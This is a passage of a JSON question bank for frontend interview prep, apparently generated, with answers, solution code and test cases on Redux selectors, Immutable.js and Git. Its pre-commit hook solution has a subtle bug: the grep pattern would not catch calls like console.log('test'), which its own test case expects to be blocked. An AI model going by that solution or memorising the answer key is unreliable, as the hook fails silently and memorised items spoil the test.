            "Ability to connect concept to practical performance gains."
          ],
          "example": "```javascript\n// In a React component:\n// const products = useSelector(selectProductsInLocalCurrency);\n// Even if the entire Redux state object changes, if the `products.list` and `settings.currencyRate` portions\n// of the state remain shallowly equal, the selector will return the cached `products` array,\n// preventing the component from re-rendering unless necessary.\n```",
          "tags": [
            "Redux",
            "Selectors",
            "Reselect",
            "Performance",
            "Memoization"
          ],
          "prerequisites": [
            "Redux basic",
            "JavaScript functions"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_js_core_concept_9",
          "topic": "Immutable.js",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the core principle behind Immutable.js data structures, and how does it differ from native JavaScript arrays/objects in terms of modification?",
          "answer": "The core principle of Immutable.js is that data structures are *immutable and persistent*. This means that once created, they cannot be changed. Any operation that would 'modify' the data (e.g., `set`, `push`) instead returns a *new* data structure with the updated values, leaving the original data structure completely unchanged. In contrast, native JavaScript arrays and objects are *mutable*, meaning operations like `array.push()` or `object.property = value` modify the original data structure in place.",
          "analysisPoints": [
            "Definition of immutability and persistence.",
            "Contrast with mutable native JS types.",
            "Emphasis on new instance creation vs. in-place modification."
          ],
          "keyConcepts": [
            "Immutability",
            "Persistent Data Structures",
            "Mutable vs Immutable",
            "Immutable.js"
          ],
          "evaluationCriteria": [
            "Clear and concise explanation of the core principle.",
            "Accurate comparison to native JavaScript."
          ],
          "example": "```javascript\nconst arr = [1, 2];\narr.push(3); // arr is now [1, 2, 3] (mutable, in-place)\n\nimport { List } from 'immutable';\nconst immutableList = List([1, 2]);\nconst newList = immutableList.push(3); // immutableList is still List([1, 2]), newList is List([1, 2, 3])\n```",
          "tags": [
            "Immutable.js",
            "Immutability",
            "JavaScript",
            "Data Structures"
          ],
          "prerequisites": [
            "JavaScript data types"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_js_react_performance_10",
          "topic": "Immutable.js",
          "level": "medium",
          "type": "open",
          "question": "Explain how using Immutable.js data structures can improve performance in a React application, particularly when integrated with Redux.",
          "answer": "In React, performance optimizations like `React.memo` (or `PureComponent`) rely on shallow comparisons of props and state to determine if a component needs to re-render. With mutable JavaScript objects/arrays, if a nested property changes but the parent object's reference remains the same, a shallow comparison will incorrectly indicate no change, preventing a necessary re-render. Alternatively, if a new mutable object/array is created on every state update (even if its contents are the same), it can trigger unnecessary re-renders.\n\nImmutable.js solves this by ensuring that *any* modification to a data structure (even deep changes) always results in a *new reference* being returned for the top-level data structure. This makes shallow comparisons completely reliable:\n-   If the data truly changed, a new reference is returned, and `React.memo` will correctly trigger a re-render.\n-   If the data did *not* change, the exact same reference is returned (due to structural sharing), and `React.memo` will correctly skip the re-render.\n\nThis predictability eliminates common bugs related to stale UI due to missed updates and prevents wasteful re-renders, significantly optimizing performance in complex React/Redux applications.",
          "analysisPoints": [
            "Explanation of React's shallow comparison mechanism.",
            "Problem with mutable data and shallow comparisons.",
            "How Immutable.js solves this with new references for changes.",
            "Impact on performance (preventing unnecessary re-renders, ensuring necessary ones)."
          ],
          "keyConcepts": [
            "Immutable.js",
            "React.memo",
            "PureComponent",
            "Shallow Comparison",
            "Performance Optimization",
            "Redux",
            "Immutability"
          ],
          "evaluationCriteria": [
            "Clear and accurate explanation of the technical mechanism.",
            "Strong connection between immutability and React's rendering lifecycle.",
            "Emphasis on practical performance benefits."
          ],
          "example": "Imagine a `user` object in Redux state. If it's a mutable JS object and you only change `user.address.street`, the `user` object's reference remains the same, potentially causing `React.memo` to skip a re-render. If `user` is an Immutable.js `Map`, changing `user.setIn(['address', 'street'], 'New St')` would return a *new* `user` Map, correctly triggering `React.memo` to re-render components depending on `user`.",
          "tags": [
            "Immutable.js",
            "React",
            "Redux",
            "Performance",
            "Immutability"
          ],
          "prerequisites": [
            "React component lifecycle",
            "Redux state updates"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_immutable_js_list_mcq_11",
          "topic": "Immutable.js Data Structures",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following JavaScript code using Immutable.js `List`:\n\n```javascript\nimport { List } from 'immutable';\n\nconst originalList = List([10, 20, 30]);\nconst updatedList = originalList.set(1, 25);\nconst pushedList = updatedList.push(40);\n\n// What will be the value of originalList.toJS() and pushedList.toJS() respectively?\n```",
          "answer": "originalList.toJS() will be [10, 20, 30]; pushedList.toJS() will be [10, 25, 30, 40]",
          "options": [
            "originalList.toJS() will be [10, 25, 30, 40]; pushedList.toJS() will be [10, 25, 30, 40]",
            "originalList.toJS() will be [10, 20, 30]; pushedList.toJS() will be [10, 25, 30, 40]",
            "originalList.toJS() will be [10, 20, 30]; pushedList.toJS() will be [10, 20, 30, 40]",
            "originalList.toJS() will be [10, 25, 30]; pushedList.toJS() will be [10, 25, 30, 40]"
          ],
          "analysisPoints": [
            "Immutable.js methods like `set` and `push` do not mutate the original `List` instance.",
            "`originalList` remains unchanged throughout the operations.",
            "`updatedList` is a new `List` with the element at index 1 changed.",
            "`pushedList` is another new `List` based on `updatedList` with an element pushed."
          ],
          "keyConcepts": [
            "Immutable.js List",
            "Immutability",
            "Data Transformation"
          ],
          "evaluationCriteria": [
            "Correct understanding of immutable operations.",
            "Ability to trace state changes in immutable data structures."
          ],
          "example": "```javascript\nimport { List } from 'immutable';\n\nconst originalList = List([10, 20, 30]);\nconst updatedList = originalList.set(1, 25);\nconst pushedList = updatedList.push(40);\n\nconsole.log(originalList.toJS()); // [10, 20, 30] - Unchanged\nconsole.log(updatedList.toJS());  // [10, 25, 30]\nconsole.log(pushedList.toJS());   // [10, 25, 30, 40]\n```\nThis example clearly shows that `originalList` retains its initial state because `set` and `push` operations on Immutable.js Lists return new instances rather than modifying the original.",
          "tags": [
            "Immutable.js",
            "Immutability",
            "List",
            "MCQ"
          ],
          "prerequisites": [
            "Immutable.js basics"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_resolve_conflict_code_12",
          "topic": "Git Workflow Best Practices",
          "level": "medium",
          "type": "code",
          "question": "You are merging `feature/login-page` into `main` and encounter a merge conflict in `src/components/LoginPage.js`. The conflict markers show both `HEAD` (your `main` branch) and `feature/login-page` changes.\n\nWrite down the typical sequence of Git commands and actions you would take to resolve this conflict and complete the merge, including the steps within the conflicting file itself.",
          "answer": "```bash\ngit checkout main\ngit merge feature/login-page\n# At this point, Git reports conflicts. You would then manually edit `src/components/LoginPage.js`.\n\n# --- Inside src/components/LoginPage.js --- START ---\n# Git adds conflict markers like these:\n# <<<<<<< HEAD\n#   // Your changes on 'main'\n#   const user = getUserFromContext();\n# =======\n#   // Incoming changes from 'feature/login-page'\n#   const credentials = getLoginCredentials();\n# >>>>>>> feature/login-page\n\n# You would edit the file to combine the desired changes, removing conflict markers:\n#   const user = getUserFromContext();\n#   const credentials = getLoginCredentials();\n# --- Inside src/components/LoginPage.js --- END ---\n\ngit add src/components/LoginPage.js\n# Add any other files you fixed conflicts in\n\ngit commit -m \"Merge feature/login-page into main and resolve conflicts\"\n# Git will often pre-populate the merge commit message. You can customize it.\n```",
          "analysisPoints": [
            "Correct use of `git merge` to initiate conflict.",
            "Understanding of manual conflict resolution within files (removing markers, combining code).",
            "Correct command (`git add`) to mark conflicts as resolved.",
            "Correct command (`git commit`) to finalize the merge."
          ],
          "keyConcepts": [
            "Git Merge Conflicts",
            "Conflict Markers",
            "Git Add",
            "Git Commit"
          ],
          "evaluationCriteria": [
            "Correct sequence of Git commands.",
            "Demonstration of understanding how to edit conflicting files.",
            "Clarity of explanation for each step."
          ],
          "example": "This flow is essential for collaborating on projects, as merge conflicts are inevitable. Practicing manual resolution is key.",
          "tags": [
            "Git",
            "Merge",
            "Conflicts",
            "Workflow",
            "Code"
          ],
          "prerequisites": [
            "git merge",
            "file editing"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_submodule_behavior_13",
          "topic": "Git Submodules",
          "level": "hard",
          "type": "open",
          "question": "A team is considering using Git submodules for managing a shared UI component library within several frontend applications. Discuss the pros and cons of using Git submodules for this use case, and suggest an alternative approach if submodules are deemed unsuitable.",
          "answer": "**Pros of Git Submodules for a Shared UI Library:**\n1.  **Pinning specific versions**: Submodules pin the exact commit of the UI library. This ensures that each consuming application uses a consistent, tested version, preventing unexpected breaking changes from library updates.\n2.  **Decentralized development**: The UI library can be developed in its own repository, maintaining its independent history and release cycle.\n3.  **Local modification**: Developers can make local changes to the submodule for debugging or experimentation within the context of the consuming app, then potentially push those changes back to the library's main repo.\n\n**Cons of Git Submodules:**\n1.  **Complexity**: Submodule commands (`init`, `update`, `add`) add overhead and can be confusing for new developers. Cloning with `--recurse-submodules` is easy to forget.\n2.  **Branching and pushing**: Managing changes within a submodule and pushing them back to the library's repository, then updating the parent project's submodule reference, can be cumbersome and error-prone.\n3.  **No automatic updates**: Submodules don't automatically update to the latest version. Consuming applications must explicitly update their submodule references.\n4.  **Monorepo challenges**: While good for pinning, they don't offer the unified tooling or shared dependencies of true monorepos (e.g., Lerna, Nx).\n5.  **CI/CD complexity**: Build pipelines need to be aware of submodules, often requiring extra steps for cloning and dependency installation.\n\n**Alternative Approach: Package Management (npm/Yarn)**\nA more common and often preferred approach for shared UI component libraries in frontend applications is to publish the library as an npm package (or similar package manager). Consuming applications then install it as a dependency.\n\n**Benefits of Package Management:**\n-   **Simplicity**: Easy to install (`npm install`), update (`npm update`), and manage versions (semver).\n-   **Standard Workflow**: Fits into the existing npm/Yarn ecosystem for dependency management.\n-   **Centralized Registry**: Packages are distributed via a registry (public or private), simplifying discovery and access.\n-   **Build Integration**: Integrates seamlessly with standard frontend build tools (Webpack, Rollup).\n\n**Considerations for Package Management:**\n-   Requires a publishing process (e.g., to npm registry).\n-   Local development of the library alongside consuming apps often requires `npm link` or similar linking strategies, which can sometimes be tricky.",
          "analysisPoints": [
            "Comprehensive listing of pros and cons for submodules.",
            "Focus on frontend-specific challenges (UI component library).",
            "Clear explanation of an alternative (package management).",
            "Discussion of benefits and considerations for the alternative."
          ],
          "keyConcepts": [
            "Git Submodules",
            "Monorepo",
            "Shared Libraries",
            "Package Management (npm/Yarn)",
            "Dependency Management"
          ],
          "evaluationCriteria": [
            "Depth of analysis for submodules.",
            "Ability to propose and justify relevant alternatives.",
            "Understanding of common frontend architectural patterns."
          ],
          "example": "Many large organizations opt for monorepo tools like Lerna or Nx, or dedicated package repositories (e.g., Verdaccio, Nexus) to manage shared components as npm packages. This balances version control with ease of consumption.",
          "tags": [
            "Git",
            "Submodules",
            "Architecture",
            "Frontend",
            "Package Management",
            "Monorepo"
          ],
          "prerequisites": [
            "Git branching",
            "npm/yarn"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_git_workflow_setup",
          "title": "Automate Git Workflow Best Practices",
          "description": "\nAs a frontend developer, you need to set up a new project's Git configuration to enforce some best practices. Your task is to:\n\n1.  **Configure a global Git alias** for `git pull --rebase` to simplify its usage.\n2.  **Create a basic `pre-commit` Git hook** using a shell script that checks for the presence of `console.log` or `debugger` statements in staged JavaScript files. If found, the commit should be aborted with an informative message.\n3.  **Create a `.gitignore` file** that is suitable for a typical React/TypeScript project, including common build outputs, dependency directories, and environment files.\n\nYour solution should demonstrate understanding of Git aliases, custom Git hooks, and `.gitignore` best practices.",
          "difficulty": "medium",
          "startingCode": "# No starting code file, as this involves Git configuration and shell scripting.\n# You will need to create and modify files like .gitconfig, .git/hooks/pre-commit, and .gitignore.",
          "solutionCode": "# 1. Configure git pull --rebase alias (add to ~/.gitconfig or project's .git/config)\n# [alias]\n#   pr = pull --rebase\n\n# Or, set it globally:\ngit config --global alias.pr 'pull --rebase'\n\n# 2. Create .git/hooks/pre-commit script\n# (Make sure to make it executable: chmod +x .git/hooks/pre-commit)\n\n# Content for .git/hooks/pre-commit:\n```bash\n#!/bin/sh\n\n# Check for console.log or debugger in staged .js/.ts files\nSTAGED_JS_FILES=$(git diff --cached --name-only --diff-filter=ACM | grep -E '\\.(js|jsx|ts|tsx)$')\n\nif [ -n \"$STAGED_JS_FILES\" ]; then\n  if git diff --cached --text -- \"$STAGED_JS_FILES\" | grep -E -q '(console\\.log|debugger);'; then\n    echo \"\\n------------------------------------------------------------\"\n    echo \"🚫 ERROR: Found 'console.log' or 'debugger' statements in staged files.\"\n    echo \"         Please remove them before committing.         \"\n    echo \"------------------------------------------------------------\\n\"\n    exit 1\n  fi\nfi\n\nexit 0\n```\n\n# 3. Create .gitignore file at the project root\n# Content for .gitignore:\n```\n# Dependencies\nnode_modules/\n\n# Build artifacts\nbuild/\ndist/\nout/\n\n# Environment variables\n.env\n.env.local\n.env.*.local\n\n# Logs\nnpm-debug.log*\nyarn-debug.log*\n\n# OS/IDE specific\n.DS_Store\n.idea/\n.vscode/\n\n# Test coverage\ncoverage/\n```\n",
          "testCases": [
            "Verify `git pr origin main` works as `git pull --rebase origin main`.",
            "Attempt to commit a JavaScript file containing `console.log('test')` or `debugger;` statement. The commit should be aborted.",
            "Attempt to commit a JavaScript file without `console.log` or `debugger;`. The commit should succeed.",
            "Verify that `node_modules/` or `build/` directories are not tracked by Git after adding them to `.gitignore` (e.g., `git status` should not list them)."
          ],
          "hints": [
            "Git aliases can be configured in your global `.gitconfig` file or directly via `git config --global alias.<alias_name> '<command>'`.",
            "Git hooks are plain executable scripts in the `.git/hooks` directory of your repository. Remember to make the hook file executable (`chmod +x`).",
            "For the `pre-commit` hook, `git diff --cached` is useful for checking only staged changes. `grep -q` can be used to silently check for patterns, and `grep -E` for extended regex.",
            "Test your `.gitignore` by creating ignored files and running `git status`."
          ],
          "tags": [
            "Git",
            "Workflow",
            "Hooks",
            "Alias",
            ".gitignore",
            "Frontend"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "Basic Git commands",
            "Shell Scripting basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Git Workflow Best Practices",
            "Git Hooks"
          ]
        },
        {
          "id": "task_redux_selector_implementation",
          "title": "Implement Memoized Redux Selectors for a Shopping Cart",
          "description": "\nYou are developing a shopping cart feature for an e-commerce application using React and Redux. Your task is to implement memoized selectors to efficiently retrieve cart data and derived calculations.\n\n**Requirements:**\n1.  **`selectCartItems`**: A basic selector to return the raw list of items in the cart.\n2.  **`selectTotalItemsInCart`**: A memoized selector that calculates the total quantity of all items in the cart.\n3.  **`selectTotalPrice`**: A memoized selector that calculates the total price of all items in the cart, considering each item's price and quantity.\n4.  **`selectCartSummary`**: A memoized selector that combines the total items count and total price into a single object `{ totalItems, totalPrice }`.\n\nEnsure that the memoized selectors only re-compute when their relevant input state changes. Include a dummy Redux state structure to test your selectors.\n",
          "difficulty": "medium",
          "startingCode": "import { createSelector } from 'reselect';\n\n// --- Dummy Redux State Structure ---\nconst dummyState = {\n  cart: {\n    items: [\n      { id: 'p1', name: 'Laptop', price: 1200, quantity: 1 },\n      { id: 'p2', name: 'Mouse', price: 25, quantity: 2 },\n      { id: 'p3', name: 'Keyboard', price: 75, quantity: 1 }\n    ]\n  },\n  // Other state parts that should NOT trigger selector re-computation\n  user: { name: 'John Doe' },\n  settings: { theme: 'dark' }\n};\n\n// --- Your Selectors Here ---\n\n// 1. Basic selector for raw cart items\nexport const selectCartItems = (state) => state.cart.items;\n\n// 2. Memoized selector for total quantity\n// export const selectTotalItemsInCart = createSelector(\n//   [/* input selectors */],\n//   (/* inputs */) => {\n//     // computation logic\n//   }\n// );\n\n// 3. Memoized selector for total price\n// export const selectTotalPrice = createSelector(\n//   [/* input selectors */],\n//   (/* inputs */) => {\n//     // computation logic\n//   }\n// );\n\n// 4. Memoized selector for cart summary\n// export const selectCartSummary = createSelector(\n//   [/* input selectors */],\n//   (/* inputs */) => {\n//     // computation logic\n//   }\n// );\n\n// --- Test Calls (for your local verification) ---\n// console.log('Cart Items:', selectCartItems(dummyState));\n// console.log('Total Items:', selectTotalItemsInCart(dummyState));\n// console.log('Total Price:', selectTotalPrice(dummyState));\n// console.log('Cart Summary:', selectCartSummary(dummyState));\n\n// Test memoization: modify non-cart state and re-run\n// const dummyState2 = { ...dummyState, user: { name: 'Jane Doe' } };\n// console.log('Total Items (after user change):', selectTotalItemsInCart(dummyState2)); // Should not re-compute\n\n// Test re-computation: modify cart state\n// const dummyState3 = { \n//   ...dummyState, \n//   cart: { \n//     items: [...dummyState.cart.items, { id: 'p4', name: 'Webcam', price: 50, quantity: 1 }] \n//   }\n// };\n// console.log('Total Items (after cart change):', selectTotalItemsInCart(dummyState3)); // Should re-compute\n",
          "solutionCode": "import { createSelector } from 'reselect';\n\n// --- Dummy Redux State Structure ---\nconst dummyState = {\n  cart: {\n    items: [\n      { id: 'p1', name: 'Laptop', price: 1200, quantity: 1 },\n      { id: 'p2', name: 'Mouse', price: 25, quantity: 2 },\n      { id: 'p3', name: 'Keyboard', price: 75, quantity: 1 }\n    ]\n  },\n  user: { name: 'John Doe' },\n  settings: { theme: 'dark' }\n};\n\n// --- Your Selectors Here ---\n\n// 1. Basic selector for raw cart items\nexport const selectCartItems = (state) => {\n  // console.log('Running selectCartItems'); // For debugging memoization\n  return state.cart.items;\n};\n\n// 2. Memoized selector for total quantity\nexport const selectTotalItemsInCart = createSelector(\n  [selectCartItems],\n  (items) => {\n    console.log('Recalculating total items...'); // Monitor re-computation\n    return items.reduce((total, item) => total + item.quantity, 0);\n  }\n);\n\n// 3. Memoized selector for total price\nexport const selectTotalPrice = createSelector(\n  [selectCartItems],\n  (items) => {\n    console.log('Recalculating total price...'); // Monitor re-computation\n    return items.reduce((total, item) => total + (item.price * item.quantity), 0);\n  }\n);\n\n// 4. Memoized selector for cart summary\nexport const selectCartSummary = createSelector(\n  [selectTotalItemsInCart, selectTotalPrice],\n  (totalItems, totalPrice) => {\n    console.log('Recalculating cart summary...'); // Monitor re-computation\n    return { totalItems, totalPrice };\n  }\n);\n\n// --- Test Calls ---\nconsole.log('--- Initial State Calculation ---');\nconsole.log('Cart Items:', selectCartItems(dummyState));\nconsole.log('Total Items:', selectTotalItemsInCart(dummyState));\nconsole.log('Total Price:', selectTotalPrice(dummyState));\nconsole.log('Cart Summary:', selectCartSummary(dummyState));\n\nconsole.log('\\n--- Changing non-cart state (user name) ---');\nconst dummyState2 = { ...dummyState, user: { name: 'Jane Doe' } };\n// These should NOT log 'Recalculating...' because input selectors (selectCartItems, selectTotalItemsInCart, selectTotalPrice)\n// didn't change their output reference.\nconsole.log('Total Items (after user change):', selectTotalItemsInCart(dummyState2));\nconsole.log('Total Price (after user change):', selectTotalPrice(dummyState2));\nconsole.log('Cart Summary (after user change):', selectCartSummary(dummyState2));\n\nconsole.log('\\n--- Changing cart items state ---');\nconst dummyState3 = {\n  ...dummyState,\n  cart: {\n    items: [...dummyState.cart.items, { id: 'p4', name: 'Webcam', price: 50, quantity: 1 }]\n  }\n};\n// These SHOULD log 'Recalculating...' because selectCartItems' output reference changes.\nconsole.log('Total Items (after cart change):', selectTotalItemsInCart(dummyState3));\nconsole.log('Total Price (after cart change):', selectTotalPrice(dummyState3));\nconsole.log('Cart Summary (after cart change):', selectCartSummary(dummyState3));\n",
          "testCases": [
            "Initial state: `selectCartItems` should return the array of 3 items.",
            "Initial state: `selectTotalItemsInCart` should return `4` (1+2+1).",
            "Initial state: `selectTotalPrice` should return `1375` (1200*1 + 25*2 + 75*1).",
            "Initial state: `selectCartSummary` should return `{ totalItems: 4, totalPrice: 1375 }`.",
            "Modify a non-cart part of the state (e.g., `state.user`). Calls to `selectTotalItemsInCart`, `selectTotalPrice`, and `selectCartSummary` should *not* trigger re-computation (check console logs for 'Recalculating...').",
            "Modify the `cart.items` array (e.g., add a new item). Calls to `selectTotalItemsInCart`, `selectTotalPrice`, and `selectCartSummary` *should* trigger re-computation and reflect new correct values."
          ],
          "hints": [
            "Remember that `createSelector` takes an array of input selectors as its first argument and a 'result function' as its second.",
            "The result function of `createSelector` receives the outputs of the input selectors as its arguments.",
            "For `selectCartSummary`, you can use the other memoized selectors (`selectTotalItemsInCart`, `selectTotalPrice`) as its input selectors, demonstrating selector composition.",
            "Use `console.log` inside the result functions of your memoized selectors to visually confirm when they re-compute."
          ],
          "tags": [
            "Redux",
            "Selectors",
            "Reselect",
            "Performance",
            "State Management",
            "Frontend"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "Redux concepts",
            "JavaScript array methods (reduce, map)",
            "`reselect` library"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Redux Selectors",
            "Memoization",
            "Reselect"
          ]
        },
        {
          "id": "task_immutable_list_operations",
          "title": "Manage User Preferences with Immutable.js List",
          "description": "\nYou are building a user settings panel where users can manage a list of their preferred categories (e.g., 'Sports', 'News', 'Technology'). You decide to use Immutable.js `List` to manage this data to ensure predictable state updates and optimize React re-renders.\n\n**Requirements:**\n1.  **`addCategory(preferencesList, categoryName)`**: A function that takes an existing `Immutable.List` of categories and a new category name (string). It should return a new `Immutable.List` with the new category added, ensuring no duplicates.\n2.  **`removeCategory(preferencesList, categoryName)`**: A function that takes an existing `Immutable.List` and a category name. It should return a new `Immutable.List` with the specified category removed, if it exists.\n3.  **`toggleCategory(preferencesList, categoryName)`**: A function that checks if a category exists in the list. If it does, it removes it; otherwise, it adds it (ensuring no duplicates).\n4.  **`getCategoryByIndex(preferencesList, index)`**: A function to retrieve a category by its index, returning `undefined` if the index is out of bounds.\n\nImplement these functions, ensuring all operations return new `Immutable.List` instances and the original list remains unchanged.",
          "difficulty": "medium",
          "startingCode": "import { List } from 'immutable';\n\nconst initialPreferences = List(['Sports', 'Technology']);\n\n// 1. Function to add a category\nfunction addCategory(preferencesList, categoryName) {\n  // TODO: Implement this function\n  return preferencesList;\n}\n\n// 2. Function to remove a category\nfunction removeCategory(preferencesList, categoryName) {\n  // TODO: Implement this function\n  return preferencesList;\n}\n\n// 3. Function to toggle a category (add if not present, remove if present)\nfunction toggleCategory(preferencesList, categoryName) {\n  // TODO: Implement this function\n  return preferencesList;\n}\n\n// 4. Function to get a category by index\nfunction getCategoryByIndex(preferencesList, index) {\n  // TODO: Implement this function\n  return undefined;\n}\n\n// --- Test Cases (for your local verification) ---\n// console.log('Initial:', initialPreferences.toJS());\n\n// const addedList = addCategory(initialPreferences, 'News');\n// console.log('After adding News:', addedList.toJS());\n// console.log('Original unchanged:', initialPreferences.toJS());\n\n// const removedList = removeCategory(addedList, 'Technology');\n// console.log('After removing Technology:', removedList.toJS());\n\n// const toggledAddList = toggleCategory(removedList, 'Politics');\n// console.log('After toggling (add) Politics:', toggledAddList.toJS());\n\n// const toggledRemoveList = toggleCategory(toggledAddList, 'Sports');\n// console.log('After toggling (remove) Sports:', toggledRemoveList.toJS());\n\n// console.log('Category at index 0:', getCategoryByIndex(initialPreferences, 0));\n// console.log('Category at invalid index:', getCategoryByIndex(initialPreferences, 100));\n",
          "solutionCode": "import { List } from 'immutable';\n\nconst initialPreferences = List(['Sports', 'Technology']);\n\n// 1. Function to add a category\nfunction addCategory(preferencesList, categoryName) {\n  if (preferencesList.includes(categoryName)) {\n    return preferencesList; // Category already exists, return original list for immutability\n  }\n  return preferencesList.push(categoryName);\n}\n\n// 2. Function to remove a category\nfunction removeCategory(preferencesList, categoryName) {\n  const index = preferencesList.indexOf(categoryName);\n  if (index === -1) {\n    return preferencesList; // Category not found, return original list\n  }\n  return preferencesList.delete(index);\n}\n\n// 3. Function to toggle a category (add if not present, remove if present)\nfunction toggleCategory(preferencesList, categoryName) {\n  if (preferencesList.includes(categoryName)) {\n    return removeCategory(preferencesList, categoryName);\n  } else {\n    return addCategory(preferencesList, categoryName);\n  }\n}\n\n// 4. Function to get a category by index\nfunction getCategoryByIndex(preferencesList, index) {\n  return preferencesList.get(index);\n}\n\n// --- Test Cases ---\nconsole.log('Initial:', initialPreferences.toJS()); // [ 'Sports', 'Technology' ]\n\n// Test Add\nconst addedList = addCategory(initialPreferences, 'News');\nconsole.log('After adding News:', addedList.toJS()); // [ 'Sports', 'Technology', 'News' ]\nconsole.log('Original unchanged:', initialPreferences.toJS()); // [ 'Sports', 'Technology' ]\nconst addedExistingList = addCategory(addedList, 'Sports');\nconsole.log('After adding existing Sports (should be same as addedList):', addedExistingList.toJS()); // [ 'Sports', 'Technology', 'News' ]\n\n// Test Remove\nconst removedList = removeCategory(addedList, 'Technology');\nconsole.log('After removing Technology from addedList:', removedList.toJS()); // [ 'Sports', 'News' ]\nconst removedNonExistent = removeCategory(removedList, 'Politics');\nconsole.log('After removing non-existent Politics (should be same as removedList):', removedNonExistent.toJS()); // [ 'Sports', 'News' ]\n\n// Test Toggle\nconst toggledAddList = toggleCategory(removedList, 'Politics');\nconsole.log('After toggling (add) Politics:', toggledAddList.toJS()); // [ 'Sports', 'News', 'Politics' ]\nconst toggledRemoveList = toggleCategory(toggledAddList, 'Sports');\nconsole.log('After toggling (remove) Sports:', toggledRemoveList.toJS()); // [ 'News', 'Politics' ]\n\n// Test Get By Index\nconsole.log('Category at index 0 of initial:', getCategoryByIndex(initialPreferences, 0)); // Sports\nconsole.log('Category at index 1 of initial:', getCategoryByIndex(initialPreferences, 1)); // Technology\nconsole.log('Category at invalid index:', getCategoryByIndex(initialPreferences, 100)); // undefined\n",
          "testCases": [
            "Adding a new category: `addCategory(initial, 'News')` should return `['Sports', 'Technology', 'News']`. Original should be unchanged.",
            "Adding an existing category: `addCategory(listWithNews, 'Sports')` should return the list unchanged (no duplicate, new reference only if a change actually occurred).",
            "Removing an existing category: `removeCategory(listWithNews, 'Technology')` should return `['Sports', 'News']`. Original should be unchanged.",
            "Removing a non-existent category: `removeCategory(listWithNews, 'Finance')` should return the list unchanged.",
            "Toggling to add: `toggleCategory(initial, 'Finance')` should return `['Sports', 'Technology', 'Finance']`.",
            "Toggling to remove: `toggleCategory(listWithFinance, 'Sports')` should return `['Technology', 'Finance']`.",
            "Getting by valid index: `getCategoryByIndex(initial, 0)` should return `'Sports'`.",
            "Getting by invalid index: `getCategoryByIndex(initial, 10)` should return `undefined`."
          ],
          "hints": [
            "Remember that Immutable.js methods like `push`, `delete`, `includes`, `indexOf`, and `get` are your friends.",
            "Always ensure your functions return a new `Immutable.List` instance if any change occurs, or the *same* original instance if no logical change is made (e.g., trying to add an existing item).",
            "The `delete` method on `List` removes an element at a given index and returns a new list.",
            "The `includes` method is useful for checking existence before adding or removing."
          ],
          "tags": [
            "Immutable.js",
            "Immutability",
            "Data Structures",
            "List",
            "Functional Programming"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "Basic Immutable.js List methods",
            "JavaScript functional array methods"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Immutable.js",
            "Immutability"
          ]
        }
      ]
    }
  },
  {
    "id": "f42160fa-b85b-48be-8c9b-5e8d88c23bfd",
    "startLine": 10700,
    "endLine": 10799,
    "processedDate": "2025-06-17T11:49:25.950Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_immutable_js_intro",
          "title": "Introduction to Immutable.js and Persistent Data Structures",
          "content": "## What is Immutability?\nImmutability, in programming, means that once an object is created, it cannot be changed. Any operation that appears to modify the object actually returns a new object with the desired changes, leaving the original object untouched.\n\n## Why Immutability in Frontend Development?\n1.  **Predictability:** Immutable data flow is easier to reason about. When data doesn't change, its state is always clear, reducing bugs related to unexpected side effects.\n2.  **Performance Optimization (especially in React/Redux):** In frameworks like React, immutability simplifies change detection. Instead of deep comparisons, a simple reference equality check (`===`) is sufficient to determine if an object has changed. This is crucial for optimizing re-renders in components (e.g., using `PureComponent` or `React.memo`).\n3.  **Structural Sharing:** Immutable.js leverages structural sharing, which means that when a new version of a data structure is created, it reuses as much of the old structure as possible. Only the parts that have actually changed are copied. This minimizes memory consumption and improves performance for large data sets.\n    *   Example: If you have a `List` of 1000 items and you `push` a new item, a new `List` is returned, but it shares the underlying 1000 items with the original list. Only the new item and a small number of internal nodes are truly new.\n4.  **Easier Debugging and Time-Travel Debugging:** With immutable data, you have a complete history of states, making it straightforward to track how data evolved over time. This enables powerful debugging techniques like time-travel debugging in Redux DevTools.\n5.  **Concurrency:** While less critical in single-threaded JavaScript, immutability fundamentally simplifies concurrent programming by eliminating race conditions on shared mutable state.\n\n## What is Immutable.js?\nImmutable.js is a library created by Facebook that provides a collection of immutable, persistent data structures for JavaScript. These structures are highly optimized for performance, especially when dealing with frequent updates to large collections. It offers data structures like `List`, `Map`, `Set`, `Stack`, and `Queue`, which are analogous to their mutable JavaScript counterparts but guarantee immutability.",
          "examples": [],
          "relatedQuestions": [
            "question_immutable_js_intro_1",
            "question_immutable_js_intro_2",
            "question_immutable_js_intro_3",
            "question_immutable_js_intro_4",
            "question_immutable_js_intro_5"
          ],
          "relatedTasks": [
            "task_immutable_js_intro_1"
          ],
          "tags": [
            "Immutable.js",
            "Immutability",
            "Functional Programming",
            "Performance",
            "React"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "JavaScript_basics",
            "Data_structures_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "React_performance_optimization",
            "Redux_state_management"
          ]
        },
        {
          "id": "theory_immutable_list",
          "title": "Immutable.js List",
